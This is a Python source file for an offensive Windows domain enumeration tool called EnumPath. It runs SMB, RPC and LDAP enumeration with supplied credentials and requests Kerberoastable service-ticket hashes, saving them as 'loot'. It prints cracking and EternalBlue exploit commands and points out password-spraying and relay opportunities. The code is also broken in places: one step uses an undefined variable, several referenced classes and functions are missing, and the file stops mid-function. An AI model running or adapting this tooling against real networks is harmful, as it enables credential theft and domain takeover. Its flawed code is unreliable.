#!/usr/bin/env python3
"""
EnumPath - Windows Domain Enumeration Tool
Enhanced version with more enumeration power while staying fast
"""

import subprocess
import sys
import os
import re
import json
import argparse
from datetime import datetime
from pathlib import Path
import socket
import time
import base64
import xml.etree.ElementTree as ET
import hashlib
import random
import shlex
import threading
from concurrent.futures import ThreadPoolExecutor
import tempfile

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = BLUE = MAGENTA = ""
    class Style:
        RESET_ALL = BRIGHT = ""

class EnumPath:
    def __init__(self, target, username=None, password=None, domain=None, 
                 verbose=False, output_dir=None, timeout=15, deep=False, modules=None, 
                 attack_mode='standard', auto_exploit=False):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.verbose = verbose
        self.timeout = timeout
        self.deep = deep
        self.modules = modules or ['all']
        self.attack_mode = attack_mode
        self.auto_exploit = auto_exploit
        self.output_dir = output_dir or f"enumpath_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Validate tool availability
        self.available_tools = self._check_tool_availability()
        
        # Create enhanced output structure
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        Path(f"{self.output_dir}/loot").mkdir(exist_ok=True)
        Path(f"{self.output_dir}/loot/credentials").mkdir(exist_ok=True)
        Path(f"{self.output_dir}/loot/certificates").mkdir(exist_ok=True)
        Path(f"{self.output_dir}/loot/sensitive_files").mkdir(exist_ok=True)
        Path(f"{self.output_dir}/loot/bloodhound").mkdir(exist_ok=True)
        Path(f"{self.output_dir}/commands").mkdir(exist_ok=True)
        Path(f"{self.output_dir}/evidence").mkdir(exist_ok=True)
        
        # Enhanced results storage
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'version': '3.0',
            'services': {},
            'shares': [],
            'users': [],
            'groups': [],
            'computers': [],
            'password_policy': {},
            'vulnerabilities': [],
            'credentials': [],
            'domain_info': {},
            'kerberos': {},
            'ldap': {},
            'attack_paths': [],
            'delegation': [],
            'adcs': {},
            'coercion_vectors': [],
            'privilege_escalation': [],
            'persistence_mechanisms': [],
            'sensitive_files': [],
            'gpp_passwords': [],
            'trust_relationships': []
        }
        
        # Initialize modules
        self.smb_advanced = SMBAdvancedEnum(self)
        self.ldap_advanced = LDAPAdvancedEnum(self)
        self.kerberos_advanced = KerberosAdvanced(self)
        self.adcs_enum = ADCSEnum(self)
        self.coercion_enum = CoercionEnum(self)
        self.privesc_enum = PrivEscEnum(self)
        self.credential_mgr = CredentialManager(self)
    
    def _check_tool_availability(self):
        """Check which enumeration tools are available"""
        tools = {
            'crackmapexec': self._test_tool(['crackmapexec', '--help']),
            'netexec': self._test_tool(['netexec', '--help']),
            'smbclient': self._test_tool(['smbclient', '--help']),
            'smbmap': self._test_tool(['smbmap', '--help']),
            'rpcclient': self._test_tool(['rpcclient', '--help']),
            'ldapsearch': self._test_tool(['ldapsearch', '--help']),
            'nmap': self._test_tool(['nmap', '--help']),
            'impacket-GetUserSPNs': self._test_tool(['impacket-GetUserSPNs', '--help']),
            'impacket-GetNPUsers': self._test_tool(['impacket-GetNPUsers', '--help'])
        }
        
        missing_tools = [tool for tool, available in tools.items() if not available]
        if missing_tools:
            print(f"{Fore.YELLOW}[!] Missing tools: {', '.join(missing_tools)}{Style.RESET_ALL}")
            if self.verbose:
                print(f"{Fore.YELLOW}[!] Some enumeration features may be limited{Style.RESET_ALL}")
        
        available_count = sum(tools.values())
        print(f"{Fore.GREEN}[+] Available tools: {available_count}/{len(tools)}{Style.RESET_ALL}")
        
        return tools
    
    def _test_tool(self, cmd):
        """Test if a tool is available and working"""
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=5, text=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def banner(self):
        """Display banner"""
        print(f"""{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║                          EnumPath                                ║
║              Windows Domain Enumeration Tool                     ║
║                         Version 3.0                              ║
║              Advanced Domain Attack Path Discovery               ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")

    def run_command(self, cmd, timeout=None, operation_name="command"):
        """Run command with proper error handling and visibility"""
        if timeout is None:
            timeout = self.timeout
        
        # Handle both string and list inputs
        if isinstance(cmd, str):
            # For backward compatibility, but show warning
            if self.verbose:
                print(f"{Fore.YELLOW}[WARNING] Using shell string command - consider using list format{Style.RESET_ALL}")
            cmd_display = cmd[:100] + ('...' if len(cmd) > 100 else '')
            use_shell = True
        else:
            # List format - safer for credentials
            cmd_display = ' '.join(shlex.quote(str(arg)) for arg in cmd)[:100] + ('...' if len(' '.join(map(str, cmd))) > 100 else '')
            use_shell = False
            
        if self.verbose:
            print(f"{Fore.BLUE}[DEBUG] {operation_name}: {cmd_display}{Style.RESET_ALL}")
        
        try:
            result = subprocess.run(
                cmd,
                shell=use_shell,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            # Show errors if command failed
            if result.returncode != 0:
                print(f"{Fore.RED}[!] {operation_name} failed (exit {result.returncode}){Style.RESET_ALL}")
                if result.stderr and self.verbose:
                    print(f"{Fore.RED}[!] Error: {result.stderr[:200]}{'...' if len(result.stderr) > 200 else ''}{Style.RESET_ALL}")
                elif not result.stdout and not result.stderr:
                    print(f"{Fore.RED}[!] No output from {operation_name} - tool may not be working{Style.RESET_ALL}")
            elif self.verbose and result.stdout:
                print(f"{Fore.GREEN}[+] {operation_name} succeeded, {len(result.stdout)} bytes output{Style.RESET_ALL}")
            
            return result.stdout, result.stderr, result.returncode
            
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[!] {operation_name} timed out after {timeout}s{Style.RESET_ALL}")
            return "", "Timeout", 1
        except Exception as e:
            print(f"{Fore.RED}[!] {operation_name} error: {e}{Style.RESET_ALL}")
            return "", str(e), 1

    def check_port(self, port, timeout=2):
        """Quick port check"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()
            return result == 0
        except:
            return False

    def test_connectivity(self):
        """Test basic connectivity with fallback to port checking"""
        print(f"\n{Fore.YELLOW}[*] Testing connectivity to {self.target}{Style.RESET_ALL}")
        
        # Try ping first
        cmd = f"ping -c 1 -W 2 {self.target}"
        stdout, _, returncode = self.run_command(cmd, timeout=3)
        
        if returncode == 0:
            print(f"{Fore.GREEN}[+] Target is reachable (ping success){Style.RESET_ALL}")
            return True
        
        # If ping fails, try to connect to common ports
        print(f"{Fore.YELLOW}[!] Ping failed, testing common ports...{Style.RESET_ALL}")
        common_ports = [445, 135, 139, 80, 443, 389, 88]
        
        for port in common_ports:
            if self.check_port(port, timeout=1):
                print(f"{Fore.GREEN}[+] Target is reachable (port {port} open){Style.RESET_ALL}")
                return True
        
        print(f"{Fore.RED}[!] Target appears unreachable (no response on common ports){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Continuing anyway - target might be filtering traffic{Style.RESET_ALL}")
        return True  # Continue execution even if connectivity check fails

    def scan_services(self):
        """Service discovery"""
        print(f"\n{Fore.YELLOW}[*] Scanning services...{Style.RESET_ALL}")
        
        ports = {
            445: "SMB", 139: "NetBIOS", 135: "RPC", 3389: "RDP",
            5985: "WinRM-HTTP", 5986: "WinRM-HTTPS", 88: "Kerberos",
            389: "LDAP", 636: "LDAPS", 80: "HTTP", 443: "HTTPS",
            1433: "MSSQL", 3268: "GlobalCatalog", 9389: "ADWS"
        }
        
        for port, service in ports.items():
            if self.verbose:
                print(f"{Fore.BLUE}[DEBUG] Checking port {port} ({service}){Style.RESET_ALL}")
            
            if self.check_port(port):
                self.results['services'][port] = service
                if port in [445, 5985, 3389, 88]:  # Important services
                    print(f"{Fore.GREEN}[+] Port {port:5} ({service}) is open{Style.RESET_ALL}")
                elif self.verbose:
                    print(f"{Fore.CYAN}[+] Port {port:5} ({service}) is open{Style.RESET_ALL}")
        
        if self.verbose and len(self.results['services']) == 0:
            print(f"{Fore.YELLOW}[!] No open ports found among {len(ports)} tested ports{Style.RESET_ALL}")
        
        return len(self.results['services']) > 0

    def enum_smb_info(self):
        """Enhanced SMB enumeration with fallback methods"""
        if 445 not in self.results['services']:
            print(f"{Fore.YELLOW}[!] SMB port 445 not detected as open - skipping SMB enumeration{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] SMB Enumeration{Style.RESET_ALL}")
        
        # Try multiple tools in order of preference
        smb_methods = []
        
        if self.available_tools.get('netexec'):
            smb_methods.append(('netexec', self._enum_smb_netexec))
        if self.available_tools.get('crackmapexec'):
            smb_methods.append(('crackmapexec', self._enum_smb_crackmapexec))
        if self.available_tools.get('smbclient'):
            smb_methods.append(('smbclient', self._enum_smb_smbclient))
        
        if not smb_methods:
            print(f"{Fore.RED}[!] No SMB enumeration tools available!{Style.RESET_ALL}")
            return
        
        # Try each method until one succeeds
        for tool_name, method_func in smb_methods:
            print(f"{Fore.CYAN}[*] Trying SMB enumeration with {tool_name}...{Style.RESET_ALL}")
            try:
                if method_func():
                    print(f"{Fore.GREEN}[+] SMB enumeration successful with {tool_name}{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.YELLOW}[!] {tool_name} returned no useful results{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] {tool_name} failed: {e}{Style.RESET_ALL}")
        
        # Always try nmap for additional info if available
        if self.deep and self.available_tools.get('nmap'):
            self._enum_smb_nmap()
    
    def _enum_smb_netexec(self):
        """SMB enumeration using netexec with multiple auth methods"""
        if not self.username:
            cmd = ['netexec', 'smb', self.target, '-u', '', '-p', '']
            stdout, stderr, returncode = self.run_command(cmd, timeout=15, operation_name="NetExec SMB")
            return self._parse_smb_output(stdout, "netexec")
        
        # Try different authentication methods
        auth_methods = [
            (['netexec', 'smb', self.target, '-u', self.username, '-p', self.password], "default"),
            (['netexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--auth-type', 'ntlm'], "NTLM"),
            (['netexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--kerberos'], "Kerberos"),
            (['netexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--local-auth'], "Local")
        ]
        
        for cmd, auth_type in auth_methods:
            if self.verbose:
                print(f"{Fore.BLUE}[DEBUG] Trying NetExec with {auth_type} auth{Style.RESET_ALL}")
            
            stdout, stderr, returncode = self.run_command(cmd, timeout=15, operation_name=f"NetExec SMB ({auth_type})")
            
            # Check if authentication was successful (not STATUS_NOT_SUPPORTED)
            if returncode == 0 or (stdout and "STATUS_NOT_SUPPORTED" not in stdout):
                if self._parse_smb_output(stdout, "netexec"):
                    print(f"{Fore.GREEN}[+] NetExec succeeded with {auth_type} authentication{Style.RESET_ALL}")
                    return True
            elif self.verbose:
                print(f"{Fore.YELLOW}[!] {auth_type} auth failed - trying next method{Style.RESET_ALL}")
        
        return False
    
    def _enum_smb_crackmapexec(self):
        """SMB enumeration using crackmapexec with multiple auth methods"""
        if not self.username:
            cmd = ['crackmapexec', 'smb', self.target, '-u', '', '-p', '']
            stdout, stderr, returncode = self.run_command(cmd, timeout=15, operation_name="CrackMapExec SMB")
            return self._parse_smb_output(stdout, "crackmapexec")
        
        # Try different authentication methods
        auth_methods = [
            (['crackmapexec', 'smb', self.target, '-u', self.username, '-p', self.password], "default"),
            (['crackmapexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--local-auth'], "Local"),
            (['crackmapexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--kerberos'], "Kerberos")
        ]
        
        for cmd, auth_type in auth_methods:
            if self.verbose:
                print(f"{Fore.BLUE}[DEBUG] Trying CrackMapExec with {auth_type} auth{Style.RESET_ALL}")
            
            stdout, stderr, returncode = self.run_command(cmd, timeout=15, operation_name=f"CrackMapExec SMB ({auth_type})")
            
            # Check if authentication was successful
            if returncode == 0 or (stdout and "STATUS_NOT_SUPPORTED" not in stdout):
                if self._parse_smb_output(stdout, "crackmapexec"):
                    print(f"{Fore.GREEN}[+] CrackMapExec succeeded with {auth_type} authentication{Style.RESET_ALL}")
                    return True
            elif self.verbose:
                print(f"{Fore.YELLOW}[!] {auth_type} auth failed - trying next method{Style.RESET_ALL}")
        
        return False
    
    def _enum_smb_smbclient(self):
        """SMB enumeration using smbclient with multiple auth methods"""
        if not self.username:
            cmd = ['smbclient', '-L', self.target, '-N']
            stdout, stderr, returncode = self.run_command(cmd, timeout=15, operation_name="SMBClient")
            if returncode == 0 and stdout and "Sharename" in stdout:
                print(f"{Fore.GREEN}[+] Anonymous SMB access working{Style.RESET_ALL}")
                return True
            return False
        
        # Try different authentication methods
        auth_methods = [
            (['smbclient', '-L', self.target, '-U', f'{self.username}%{self.password}'], "default"),
            (['smbclient', '-L', self.target, '-U', f'{self.username}%{self.password}', '--option=use_spnego=no'], "No SPNEGO"),
            (['smbclient', '-L', self.target, '-U', f'{self.username}%{self.password}', '--option=client_ntlmv2_auth=no'], "No NTLMv2"),
            (['smbclient', '-L', self.target, '-U', f'{self.username}%{self.password}', '-k'], "Kerberos")
        ]
        
        for cmd, auth_type in auth_methods:
            if self.verbose:
                print(f"{Fore.BLUE}[DEBUG] Trying smbclient with {auth_type} auth{Style.RESET_ALL}")
            
            stdout, stderr, returncode = self.run_command(cmd, timeout=15, operation_name=f"SMBClient ({auth_type})")
            
            if returncode == 0 and stdout and "Sharename" in stdout:
                print(f"{Fore.GREEN}[+] SMBClient succeeded with {auth_type} authentication{Style.RESET_ALL}")
                return True
            elif self.verbose:
                print(f"{Fore.YELLOW}[!] {auth_type} auth failed - trying next method{Style.RESET_ALL}")
        
        return False
    
    def _enum_smb_nmap(self):
        """Additional SMB info using nmap"""
        cmd = f"nmap -p445 --script smb-os-discovery,smb-security-mode {self.target} -Pn"
        stdout, stderr, returncode = self.run_command(cmd, timeout=20, operation_name="Nmap SMB scripts")
        
        if "OS:" in stdout:
            os_match = re.search(r'OS:\s*([^\n]+)', stdout)
            if os_match:
                os_info = os_match.group(1).strip()
                self.results['domain_info']['os'] = os_info
                print(f"{Fore.GREEN}[+] OS: {os_info}{Style.RESET_ALL}")
    
    def _parse_smb_output(self, stdout, tool_name):
        """Parse SMB enumeration output from various tools"""
        if not stdout:
            return False
        
        found_info = False
        
        # NetExec/CrackMapExec modern format: (name:hostname) (domain:domain) (signing:True)
        if "(name:" in stdout.lower():
            match = re.search(r'\(name:([^\)]+)\)', stdout)
            if match:
                hostname = match.group(1).strip()
                self.results['domain_info']['hostname'] = hostname
                print(f"{Fore.GREEN}[+] Hostname: {hostname}{Style.RESET_ALL}")
                found_info = True
        
        if "(domain:" in stdout.lower():
            match = re.search(r'\(domain:([^\)]+)\)', stdout)
            if match:
                domain = match.group(1).strip()
                hostname = self.results['domain_info'].get('hostname', '')
                
                # Check if it's a valid domain name (not IP, not hostname, not empty)
                if (not re.match(r'^\d+\.\d+\.\d+\.\d+$', domain) and 
                    domain.lower() not in [hostname.lower() if hostname else '', self.target] and
                    '.' in domain and
                    domain.lower() != 'workgroup'):
                    self.domain = domain
                    self.results['domain_info']['domain'] = domain
                    self.results['domain_info']['is_domain_joined'] = True
                    print(f"{Fore.GREEN}[+] Domain: {domain}{Style.RESET_ALL}")
                else:
                    self.domain = None  # Explicitly set to None for standalone
                    self.results['domain_info']['is_domain_joined'] = False
                    print(f"{Fore.YELLOW}[+] Target is standalone (not domain-joined){Style.RESET_ALL}")
                found_info = True
        
        # Check SMB signing - modern format
        if "(signing:true)" in stdout.lower():
            print(f"{Fore.YELLOW}[+] SMB Signing enabled (required){Style.RESET_ALL}")
            found_info = True
        elif "(signing:false)" in stdout.lower():
            self.results['vulnerabilities'].append("SMB Signing disabled")
            self.results['attack_paths'].append("SMB Relay Attack possible")
            print(f"{Fore.RED}[!] SMB Signing disabled - Relay attacks possible!{Style.RESET_ALL}")
            found_info = True
        
        # Check OS architecture
        if "x64" in stdout:
            print(f"{Fore.GREEN}[+] Architecture: x64{Style.RESET_ALL}")
            self.results['domain_info']['architecture'] = 'x64'
            found_info = True
        elif "x86" in stdout:
            print(f"{Fore.GREEN}[+] Architecture: x86{Style.RESET_ALL}")
            self.results['domain_info']['architecture'] = 'x86'
            found_info = True
        
        # Check SMB versions
        if "(SMBv1:False)" in stdout:
            print(f"{Fore.GREEN}[+] SMBv1 disabled (good security){Style.RESET_ALL}")
        elif "(SMBv1:True)" in stdout:
            print(f"{Fore.RED}[!] SMBv1 enabled - security risk{Style.RESET_ALL}")
            self.results['vulnerabilities'].append("SMBv1 enabled")
            found_info = True
        
        # Check for successful authentication (modern tools)
        if self.username and ("STATUS_SUCCESS" in stdout or "[+]" in stdout):
            print(f"{Fore.GREEN}[+] Valid credentials confirmed{Style.RESET_ALL}")
            self.results['credentials'].append({
                'username': self.username,
                'password': self.password,
                'valid': True
            })
            found_info = True
        
        # Check for authentication failures
        if "STATUS_LOGON_FAILURE" in stdout:
            print(f"{Fore.RED}[!] Authentication failed - invalid credentials{Style.RESET_ALL}")
        elif "STATUS_NOT_SUPPORTED" in stdout:
            print(f"{Fore.YELLOW}[+] Anonymous access not supported{Style.RESET_ALL}")
        
        return found_info

    def enum_shares(self):
        """Enhanced share enumeration with multiple methods"""
        if 445 not in self.results['services']:
            return
        
        print(f"\n{Fore.YELLOW}[*] Enumerating shares...{Style.RESET_ALL}")
        
        # Try multiple enumeration methods
        shares_found = self._enum_shares_smbmap() or self._enum_shares_smbclient() or self._enum_shares_netexec()
        
        if not shares_found:
            print(f"{Fore.RED}[!] No shares accessible with provided credentials{Style.RESET_ALL}")
    
    def _enum_shares_smbmap(self):
        """Share enumeration using smbmap with improved syntax"""
        if not self.available_tools.get('smbmap'):
            return False
        
        print(f"{Fore.BLUE}[*] Trying share enumeration with smbmap...{Style.RESET_ALL}")
        
        # Try different smbmap configurations
        if self.username:
            auth_methods = [
                (['smbmap', '-H', self.target, '-u', self.username, '-p', self.password], "user auth"),
                (['smbmap', '-H', self.target, '-u', self.username, '-p', self.password, '--no-banner'], "user auth (no banner)"),
                (['smbmap', '-H', self.target, '-u', self.username, '--no-pass'], "user without password"),
            ]
        else:
            auth_methods = [
                (['smbmap', '-H', self.target], "anonymous"),
                (['smbmap', '-H', self.target, '--no-banner'], "anonymous (no banner)"),
            ]
        
        for cmd, auth_type in auth_methods:
            if self.verbose:
                print(f"{Fore.BLUE}[DEBUG] Trying smbmap with {auth_type}{Style.RESET_ALL}")
            
            stdout, stderr, returncode = self.run_command(cmd, timeout=20, operation_name=f"smbmap ({auth_type})")
            
            if returncode == 0 and stdout:
                if self._parse_smbmap_output(stdout):
                    print(f"{Fore.GREEN}[+] smbmap succeeded with {auth_type}{Style.RESET_ALL}")
                    return True
            elif returncode == 2 and self.verbose:
                print(f"{Fore.YELLOW}[!] smbmap syntax error with {auth_type} - trying alternative{Style.RESET_ALL}")
        
        return False
    
    def _enum_shares_smbclient(self):
        """Share enumeration using smbclient as fallback"""
        if not self.available_tools.get('smbclient'):
            return False
        
        print(f"{Fore.BLUE}[*] Trying share enumeration with smbclient...{Style.RESET_ALL}")
        
        if self.username:
            cmd = ['smbclient', '-L', self.target, '-U', f'{self.username}%{self.password}']
        else:
            cmd = ['smbclient', '-L', self.target, '-N']
        
        stdout, stderr, returncode = self.run_command(cmd, timeout=20, operation_name="smbclient shares")
        
        if returncode == 0 and stdout and "Sharename" in stdout:
            return self._parse_smbclient_shares(stdout)
        
        return False
    
    def _enum_shares_netexec(self):
        """Share enumeration using netexec as fallback"""
        if not self.available_tools.get('netexec'):
            return False
        
        print(f"{Fore.BLUE}[*] Trying share enumeration with netexec...{Style.RESET_ALL}")
        
        if self.username:
            cmd = ['netexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--shares']
        else:
            cmd = ['netexec', 'smb', self.target, '--shares']
        
        stdout, stderr, returncode = self.run_command(cmd, timeout=20, operation_name="netexec shares")
        
        if returncode == 0 and stdout:
            return self._parse_netexec_shares(stdout)
        
        return False
    
    def _parse_smbmap_output(self, stdout):
        """Parse smbmap output for shares"""
        writable_shares = []
        readable_shares = []
        
        for line in stdout.split('\n'):
            if '\t' in line and any(x in line for x in ['READ', 'WRITE', 'NO ACCESS']):
                parts = line.split('\t')
                if len(parts) >= 2:
                    share_name = parts[0].strip()
                    perms = parts[1].strip() if len(parts) > 1 else 'Unknown'
                    
                    if share_name and not share_name.startswith('['):
                        print(f"{Fore.CYAN}    {share_name:<20} {perms}{Style.RESET_ALL}")
                        self.results['shares'].append({'name': share_name, 'permissions': perms})
                        
                        if 'WRITE' in perms:
                            writable_shares.append(share_name)
                        if 'READ' in perms.upper():
                            readable_shares.append(share_name)
        
        if writable_shares:
            print(f"{Fore.RED}[!] Writable shares found: {', '.join(writable_shares)}{Style.RESET_ALL}")
            self.results['attack_paths'].append(f"Writable SMB shares: {', '.join(writable_shares)}")
        
        return len(self.results['shares']) > 0
    
    def _parse_smbclient_shares(self, stdout):
        """Parse smbclient -L output for shares"""
        shares = []
        in_shares_section = False
        
        for line in stdout.split('\n'):
            line = line.strip()
            if "Sharename" in line and "Type" in line:
                in_shares_section = True
                continue
            elif "Reconnecting with SMB1" in line or "=" in line[:10]:
                in_shares_section = False
                continue
            
            if in_shares_section and line and not line.startswith('-'):
                parts = line.split()
                if len(parts) >= 2:
                    share_name = parts[0]
                    share_type = parts[1] if len(parts) > 1 else 'Unknown'
                    
                    if share_name and share_name not in ['IPC$', 'print$']:
                        print(f"{Fore.CYAN}    {share_name:<20} {share_type}{Style.RESET_ALL}")
                        shares.append({'name': share_name, 'type': share_type})
                        self.results['shares'].append({'name': share_name, 'permissions': 'Unknown'})
        
        return len(shares) > 0
    
    def _parse_netexec_shares(self, stdout):
        """Parse NetExec --shares output"""
        shares = []
        
        for line in stdout.split('\n'):
            if 'Share:' in line or '[+]' in line:
                # NetExec format: [+] Share: SHARENAME  READ, WRITE
                if 'Share:' in line:
                    parts = line.split('Share:')
                    if len(parts) > 1:
                        share_info = parts[1].strip()
                        share_parts = share_info.split()
                        if share_parts:
                            share_name = share_parts[0]
                            perms = ' '.join(share_parts[1:]) if len(share_parts) > 1 else 'Unknown'
                            
                            print(f"{Fore.CYAN}    {share_name:<20} {perms}{Style.RESET_ALL}")
                            shares.append({'name': share_name, 'permissions': perms})
                            self.results['shares'].append({'name': share_name, 'permissions': perms})
        
        return len(shares) > 0

    def enum_users(self):
        """Enhanced user enumeration"""
        print(f"\n{Fore.YELLOW}[*] Enumerating users...{Style.RESET_ALL}")
        
        users_found = set()
        
        # Method 1: CrackMapExec --users
        if self.username:
            cmd = ['crackmapexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--users']
            stdout, _, returncode = self.run_command(cmd, timeout=30)
            
            if returncode == 0 and stdout:
                # Parse different formats
                users = re.findall(r'\\\\?[^\\]+\\([^\s\\]+)', stdout)
                for user in users:
                    users_found.add(user.lower())
        
        # Method 2: RPC enumeration
        if self.username and self.deep:
            cmd = ['rpcclient', '-U', f'{self.username}%{self.password}', self.target, '-c', 'enumdomusers']
            stdout, _, returncode = self.run_command(cmd, timeout=20)
            
            if returncode == 0 and "user:" in stdout:
                users = re.findall(r'user:\[(.*?)\]', stdout)
                for user in users:
                    users_found.add(user.lower())
        
        # Method 3: LDAP anonymous bind (if available)
        if 389 in self.results['services'] and not self.username:
            print(f"{Fore.YELLOW}[*] Trying LDAP anonymous bind...{Style.RESET_ALL}")
            domain_dn = f"dc={self.domain.replace('.', ',dc=')}" if self.domain else ""
            cmd = f"ldapsearch -x -H ldap://{self.target} -b '{domain_dn}' '(objectClass=user)' sAMAccountName | grep sAMAccountName"
            stdout, _, _ = self.run_command(cmd, timeout=20)
            
            if stdout:
                users = re.findall(r'sAMAccountName:\s*(\S+)', stdout)
                for user in users:
                    users_found.add(user.lower())
        
        # Store results
        for user in users_found:
            self.results['users'].append({'username': user})
            print(f"{Fore.GREEN}[+] User: {user}{Style.RESET_ALL}")
        
        # Save user list
        if users_found:
            users_file = os.path.join(self.output_dir, 'users.txt')
            with open(users_file, 'w') as f:
                for user in sorted(users_found):
                    f.write(f"{user}\n")
            print(f"{Fore.GREEN}[+] Saved {len(users_found)} users to {users_file}{Style.RESET_ALL}")
            
            # Generate password spray commands
            self.generate_spray_list(users_file)

    def enum_groups(self):
        """Enumerate groups"""
        if not self.username or not self.deep:
            return
        
        print(f"\n{Fore.YELLOW}[*] Enumerating groups...{Style.RESET_ALL}")
        
        cmd = ['rpcclient', '-U', f'{self.username}%{self.password}', self.target, '-c', 'enumdomgroups']
        stdout, _, returncode = self.run_command(cmd, timeout=20)
        
        if returncode == 0 and "group:" in stdout:
            groups = re.findall(r'group:\[(.*?)\]', stdout)
            important_groups = ['Domain Admins', 'Enterprise Admins', 'Administrators', 
                              'Backup Operators', 'Server Operators', 'DnsAdmins']
            
            for group in groups:
                self.results['groups'].append({'name': group})
                if any(ig in group for ig in important_groups):
                    print(f"{Fore.RED}[+] Privileged Group: {group}{Style.RESET_ALL}")
                elif self.verbose:
                    print(f"{Fore.GREEN}[+] Group: {group}{Style.RESET_ALL}")

    def check_password_policy(self):
        """Get password policy"""
        if not self.username:
            return
        
        print(f"\n{Fore.YELLOW}[*] Checking password policy...{Style.RESET_ALL}")
        
        cmd = ['crackmapexec', 'smb', self.target, '-u', self.username, '-p', self.password, '--pass-pol']
        stdout, _, returncode = self.run_command(cmd, timeout=15)
        
        if returncode == 0 and stdout:
            # Parse policy
            if "minimum password length" in stdout.lower():
                match = re.search(r'minimum password length:\s*(\d+)', stdout.lower())
                if match:
                    min_len = int(match.group(1))
                    self.results['password_policy']['min_length'] = min_len
                    print(f"{Fore.CYAN}[+] Min password length: {min_len}{Style.RESET_ALL}")
            
            if "password complexity" in stdout.lower():
                if "enabled" in stdout.lower():
                    self.results['password_policy']['complexity'] = True
                    print(f"{Fore.CYAN}[+] Password complexity: Enabled{Style.RESET_ALL}")
                else:
                    self.results['password_policy']['complexity'] = False
                    print(f"{Fore.YELLOW}[+] Password complexity: Disabled{Style.RESET_ALL}")
            
            if "lockout threshold" in stdout.lower():
                match = re.search(r'lockout threshold:\s*(\d+|none)', stdout.lower())
                if match:
                    threshold = match.group(1)
                    if threshold.lower() == 'none' or threshold == '0':
                        self.results['password_policy']['lockout'] = None
                        self.results['vulnerabilities'].append("No account lockout policy")
                        self.results['attack_paths'].append("Password spraying possible")
                        print(f"{Fore.RED}[!] No lockout policy - password spraying possible!{Style.RESET_ALL}")
                    else:
                        self.results['password_policy']['lockout'] = int(threshold)
                        print(f"{Fore.CYAN}[+] Lockout threshold: {threshold}{Style.RESET_ALL}")

    def check_vulnerabilities(self):
        """Check for common vulnerabilities"""
        print(f"\n{Fore.YELLOW}[*] Checking vulnerabilities...{Style.RESET_ALL}")
        
        # MS17-010 check
        if 445 in self.results['services']:
            cmd = f"nmap -p445 --script smb-vuln-ms17-010 {self.target} -Pn"
            stdout, _, _ = self.run_command(cmd, timeout=30)
            
            if "VULNERABLE" in stdout:
                self.results['vulnerabilities'].append("MS17-010 (EternalBlue)")
                self.results['attack_paths'].append("MS17-010 exploitation")
                print(f"{Fore.RED}[!] VULNERABLE to MS17-010 (EternalBlue)!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'{Style.RESET_ALL}")
        
        # PrintNightmare check
        if self.username and self.deep:
            cmd = f"rpcdump.py {shlex.quote(f'{self.username}:{self.password}@{self.target}')} | grep -E 'MS-RPRN|MS-PAR'"
            stdout, _, _ = self.run_command(cmd, timeout=20)
            
            if "MS-RPRN" in stdout or "MS-PAR" in stdout:
                self.results['vulnerabilities'].append("Print Spooler Service (PrintNightmare)")
                print(f"{Fore.YELLOW}[!] Print Spooler service detected - check for PrintNightmare{Style.RESET_ALL}")

    def check_kerberos(self):
        """Kerberos enumeration and attacks"""
        if not self.username or 88 not in self.results['services']:
            return
        
        # Skip Kerberos enumeration for standalone systems
        if not self.domain or not self.results['domain_info'].get('is_domain_joined', False):
            print(f"\n{Fore.YELLOW}[*] Skipping Kerberos enumeration - target is standalone{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] Kerberos enumeration...{Style.RESET_ALL}")
        
        # Kerberoasting
        cmd = ['impacket-GetUserSPNs', f'{self.domain}/{self.username}:{self.password}', '-dc-ip', self.target, '-request']
        stdout, _, returncode = self.run_command(cmd, timeout=30)
        
        if returncode == 0 and "$krb5tgs$" in stdout:
            count = stdout.count("$krb5tgs$")
            self.results['kerberos']['kerberoastable'] = count
            self.results['vulnerabilities'].append(f"Kerberoastable accounts: {count}")
            self.results['attack_paths'].append(f"Kerberoast {count} service accounts")
            print(f"{Fore.RED}[!] Found {count} Kerberoastable accounts!{Style.RESET_ALL}")
            
            # Save hashes
            hash_file = os.path.join(self.output_dir, 'loot', 'kerberoast.txt')
            with open(hash_file, 'w') as f:
                f.write(stdout)
            print(f"{Fore.GREEN}[+] Hashes saved to {hash_file}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt{Style.RESET_ALL}")
        
        # AS-REP Roasting
        if self.deep and os.path.exists(f"{self.output_dir}/users.txt"):
            cmd = f"impacket-GetNPUsers '{domain}/' -usersfile {self.output_dir}/users.txt -dc-ip {self.target}"
            stdout, _, returncode = self.run_command(cmd, timeout=30)
            
            if returncode == 0 and "$krb5asrep$" in stdout:
                count = stdout.count("$krb5asrep$")
                self.results['kerberos']['asreproastable'] = count
                self.results['vulnerabilities'].append(f"AS-REP Roastable accounts: {count}")
                print(f"{Fore.RED}[!] Found {count} AS-REP Roastable accounts!{Style.RESET_ALL}")
                
